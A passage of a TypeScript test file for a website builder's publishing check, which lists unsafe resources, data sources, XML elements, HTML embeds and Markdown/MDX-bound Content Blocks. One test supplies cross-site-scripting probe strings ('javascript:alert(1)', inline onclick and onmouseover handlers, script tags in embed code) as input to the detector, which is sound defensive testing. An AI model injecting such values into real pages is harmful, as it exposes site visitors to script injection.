      { id: "form", component: "Box" },
    ]);
    const props = toProps([
      {
        id: "form-action",
        instanceId: "form",
        name: "action",
        type: "resource",
        value: "absent-action",
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "absent-ds",
        {
          type: "resource",
          id: "absent-ds",
          name: "absent",
          scopeInstanceId: "form",
          resourceId: "absent",
        },
      ],
    ]);

    expect(find({ instances, props, dataSources })).toEqual([
      { label: "Resource (absent) on Home", navigate: onHome("form") },
      { label: "Resource (absent-action) on Home", navigate: onHome("form") },
    ]);
  });

  // A Collection's item may only be a parameter of its own that nothing around
  // it binds, and a Resource named like a global a module reads goes
  test("lists a Collection's item that names a variable, and a Resource named like a global", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("list", "form") },
      { id: "list", component: "ws:collection" },
      { id: "form", component: "Box" },
    ]);
    const props = toProps([
      {
        id: "list-item",
        instanceId: "list",
        name: "item",
        type: "parameter",
        value: "state",
      },
      {
        id: "form-action",
        instanceId: "form",
        name: "action",
        type: "resource",
        value: "global",
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "state",
        {
          type: "variable",
          id: "state",
          name: "state",
          scopeInstanceId: "home-root",
          value: { type: "string", value: "" },
        },
      ],
    ]);
    const resources = new Map<string, Resource>([
      [
        "global",
        {
          id: "global",
          name: "Map",
          method: "post",
          url: '"https://example.org/form"',
          headers: [],
        },
      ],
    ]);

    // the shared rule lists the variable a Collection binds
    expect(find({ instances, props, dataSources, resources })).toEqual([
      {
        label: "Variable (state) on Home",
        navigate: { pageId: "home", instanceSelector: ["home-root"] },
      },
      { label: "Resource (Map) on Home", navigate: onHome("form") },
    ]);
  });

  // Publishing counts the same two (organizeos-org-script.unsafe-values.test.ts)
  test("lists a global data source named like one of the module's own names, and what names it", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("box") },
      { id: "box", component: "Box" },
    ]);
    const props = toProps([
      {
        id: "box-title",
        instanceId: "box",
        name: "title",
        type: "expression",
        value: encodeDataSourceVariable("docs"),
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "docs",
        {
          type: "variable",
          id: "docs",
          name: "documents",
          scopeInstanceId: ROOT_INSTANCE_ID,
          value: { type: "string", value: "" },
        },
      ],
    ]);

    expect(find({ instances, props, dataSources })).toEqual([
      { label: "Binding (title) on Home", navigate: onHome("box") },
      { label: "Data source (documents)" },
    ]);
  });

  // Publishing counts the same (organizeos-org-script.unsafe-values.test.ts)
  test("lists a Resource or a data source that goes only where an instance that ships holds it, and opens that one", () => {
    const instances = createInstances([
      { id: "home-root", component: "Body", children: ids("node", "other") },
      { id: "node", component: "XmlNode", children: ids("form", "box") },
      { id: "form", component: "Box" },
      { id: "box", component: "Box" },
      { id: "other", component: "Box" },
    ]);
    const props = toProps([
      {
        id: "form-action",
        instanceId: "form",
        name: "action",
        type: "resource",
        value: "sent",
      },
      {
        id: "other-action",
        instanceId: "other",
        name: "action",
        type: "resource",
        value: "sent",
      },
      {
        id: "box-action",
        instanceId: "box",
        name: "action",
        type: "resource",
        value: "lost",
      },
    ]);
    const dataSources = new Map<string, DataSource>([
      [
        "loaded",
        {
          type: "resource",
          id: "loaded",
          name: "loaded",
          scopeInstanceId: "box",
          resourceId: "feed",
        },
      ],
      [
        "docs",
        {
          type: "variable",
          id: "docs",
          name: "documents",
          scopeInstanceId: "box",
          value: { type: "string", value: "" },
        },
      ],
    ]);
    const resources = new Map<string, Resource>([
      [
        "sent",
        {
          id: "sent",
          name: "Map",
          method: "post",
          url: '"https://example.org/form"',
          headers: [],
        },
      ],
      [
        "lost",
        {
          id: "lost",
          name: "Number",
          method: "post",
          url: '"https://example.org/form"',
          headers: [],
        },
      ],
      [
        "feed",
        {
          id: "feed",
          name: "feed",
          method: "get",
          url: '"https://example.org/?k=" + (0 < 1 > 2)',
          headers: [],
        },
      ],
    ]);

    expect(find({ instances, props, dataSources, resources })).toEqual([
      {
        label: "XML element on Home",
        navigate: onHome("node"),
      },
      { label: "Resource (Map) on Home", navigate: onHome("other") },
    ]);
  });

  test("lists nothing more for an instance listed for its tag", () => {
    const instances = createInstances([
      {
        id: "home-root",
        component: "Body",
        children: ids("box", "embed", "node"),
      },
      { id: "box", component: "Box" },
      { id: "embed", component: "HtmlEmbed" },
      { id: "node", component: "XmlNode" },
    ]);
    const props = toProps([
      stringProp("box", "tag", "script"),
      stringProp("box", "href", "javascript:alert(1)"),
      stringProp("box", "onclick", "alert(1)"),
      stringProp("embed", "code", "<script>1</script>"),
      stringProp("embed", "srcdoc", "<script>1</script>"),
      stringProp("node", "onmouseover", "alert(1)"),
    ]);

    expect(find({ instances, props }).map((item) => item.label)).toEqual([
      "Element with an unsupported tag on Home",
      "HTML Embed on Home",
      "XML element on Home",
    ]);
  });
});

// D7: publishing refuses a build with a Content Block bound to Markdown or MDX
// (refuseMdxWhilePaused in packages/cli/src/organizeos-org-script.ts), so the
// dialog lists those blocks by the same rule
describe("findMdxBlocks", () => {
  const fileAsset = (id: string, name: string, format: string): Asset => ({
    id,
    projectId: "project-id",
    name,
    type: "file",
    format,
    size: 10,
    meta: {},
    createdAt: "2026-01-01T00:00:00.000Z",
  });
  const mdx = fileAsset("article", "article_abc.mdx", "mdx");
  const md = fileAsset("notes", "notes_abc.md", "md");
  const image = fileAsset("photo", "photo_abc.png", "png");
  const text = fileAsset("readme", "readme_abc.txt", "txt");

  const toAssets = (list: Asset[]) =>
    new Map(list.map((asset) => [asset.id, asset]));

  const assetProp = (instanceId: string, value: string): Prop => ({
    id: `${instanceId}-src`,
    instanceId,
    name: "src",
    type: "asset",
    value,
  });

  const expressionSrc = (instanceId: string, value: string): Prop => ({
    id: `${instanceId}-src`,
    instanceId,
    name: "src",
    type: "expression",
    value,
  });

  const blockOnHome = createInstances([
    { id: "home-root", component: "Body", children: ids("block") },
    { id: "block", component: blockComponent },
  ]);

  const findBlocks = (
    overrides: Partial<Parameters<typeof findMdxBlocks>[0]> = {}
  ) =>
    findMdxBlocks({
      pages: createPages(),
      instances: blockOnHome,
      props: toProps([]),
      assets: toAssets([]),
      mayRun: false,
      ...overrides,
    });

  const listed = [
    {
      label: "Content Block on Home",
      navigate: { pageId: "home", instanceSelector: ["block", "home-root"] },
    },
  ];

  test.each([
    ["an .mdx asset", assetProp("block", "article"), [mdx]],
    ["an .md asset", assetProp("block", "notes"), [md]],
    [
      "an .mdx asset by a static expression",
      expressionSrc("block", '"article"'),
      [mdx],
    ],
    [
      "an expression, while the project holds an .mdx asset",
      expressionSrc("block", "$ws$dataSource$post.data.body"),
      [image, mdx],
    ],
    [
      "an expression, while the project holds an .md asset",
      expressionSrc("block", "$ws$dataSource$post.data.body"),
      [md],
    ],
    [
      "an asset whose format alone says MDX, in capitals",
      assetProp("block", "article"),
      [fileAsset("article", "article", "MDX")],
    ],
    [
      "an asset whose name alone says .MD",
      assetProp("block", "notes"),
      [fileAsset("notes", "notes_abc.MD", "bin")],
    ],
  ])("lists a Content Block bound to %s", (_name, src, assets) => {
    expect(
      findBlocks({ props: toProps([src]), assets: toAssets(assets) })
    ).toEqual(listed);
  });

  test.each([
    ["no source", undefined, [mdx]],
    ["an image asset", assetProp("block", "photo"), [image, mdx]],
    ["a .txt asset", assetProp("block", "readme"), [text, mdx]],
    [
      "an expression, while the project holds no Markdown or MDX",
      expressionSrc("block", "$ws$dataSource$post.data.body"),
      [image, text],
    ],
  ])("lists nothing for a Content Block with %s", (_name, src, assets) => {
    expect(
      findBlocks({
        props: toProps(src === undefined ? [] : [src]),
        assets: toAssets(assets),
      })
    ).toEqual([]);
  });

  test("lists a block on a draft page and one no page holds, as publishing refuses either", () => {
    const pages = createPages();
    const about = pages.pages.get("about");
    if (about === undefined) {
      throw new Error("no about page");
    }
    about.isDraft = true;
    const instances = createInstances([
      { id: "home-root", component: "Body" },
      { id: "about-root", component: "Body", children: ids("draft-block") },
      { id: "draft-block", component: blockComponent },
      { id: "orphan-block", component: blockComponent },
    ]);
    const props = toProps([
      assetProp("draft-block", "article"),
      assetProp("orphan-block", "article"),
    ]);

    expect(
      findBlocks({ pages, instances, props, assets: toAssets([mdx]) })
    ).toEqual([
      {
        label: "Content Block on About",
        navigate: {
          pageId: "about",
          instanceSelector: ["draft-block", "about-root"],
        },
      },
      { label: "Content Block" },
    ]);
  });

  test("lists nothing when the switch is on, or before the pages load", () => {
    const props = toProps([assetProp("block", "article")]);
    const assets = toAssets([mdx]);
    expect(findBlocks({ props, assets, mayRun: true })).toEqual([]);
    expect(findBlocks({ props, assets, pages: undefined })).toEqual([]);
  });
});
